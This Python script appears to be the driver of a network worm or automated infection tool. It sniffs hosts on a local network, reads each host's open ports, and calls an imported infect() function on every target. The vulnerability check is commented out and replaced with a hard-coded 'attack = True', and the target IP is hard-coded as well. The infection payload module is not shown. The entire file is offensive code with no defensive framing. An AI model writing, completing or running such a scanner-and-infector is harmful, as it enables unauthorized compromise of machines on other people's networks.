import sys
import time
from sniff import sniff
from infect import infect
import sqlite3


def main(ip_range):
    targets = ip_range
    targets = '192.168.1.244'
    network = sniff(targets)
    for local_ip, target_ips in network.get_host_networks().items():
        for target_ip in target_ips:
            target_port_details = network.get_host_port_details(target_ip.address)
            con = sqlite3.connect("armory/record.db")
            cur = con.cursor()
            for each_port in target_port_details[target_ip.address]["ports"]:
                #attack = network.is_vulnerable(cur,each_port)
                attack = True
                if attack:
                    infection = infect(target_ip.address)
            con.close()
            print(target_port_details)

if __name__=='__main__':
    #ip_range = sys.argv[1]
    ip_range=2
    main(ip_range)